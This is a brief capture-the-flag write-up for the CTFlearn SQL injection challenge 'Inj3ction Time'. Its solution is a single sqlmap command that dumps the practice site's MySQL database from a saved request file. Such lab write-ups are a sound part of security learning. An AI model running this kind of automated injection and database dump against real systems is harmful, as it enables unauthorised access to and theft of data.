[Inj3ction Time](https://ctflearn.com/challenge/149)

# Description

I stumbled upon this website: `p://web.ctflearn.com/web8/` and I think they have the flag in their somewhere. UNION might be a helpful command

# Solution

Run sqlmap on the requestfile

```sh
sqlmap -r ~/Projects/CTFs/ctflearn/Inj3ction_Time/request.txt --batch --dbms mysql  --dump
```
